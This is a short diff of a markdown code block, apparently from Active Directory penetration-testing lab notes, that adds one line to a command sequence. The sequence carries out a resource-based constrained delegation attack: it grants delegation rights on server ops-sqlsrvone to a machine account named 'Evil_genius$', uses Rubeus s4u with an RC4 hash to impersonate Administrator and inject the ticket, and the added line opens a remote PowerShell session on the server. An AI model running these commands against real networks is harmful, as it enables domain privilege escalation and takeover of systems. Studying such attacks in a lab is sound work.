@@ -66,5 +66,6 @@ Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
 Set-ADComputer ops-sqlsrvone -PrincipalsAllowedToDelegateToAccount Evil_genius$ -Verbose
 
 Rubeus.exe s4u /user:Evil_genius$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/opssqlsrvone /impersonateuser:Administrator /ptt
+Enter-PSSession -ComputerName ops-sqlsrvone
 ```
 
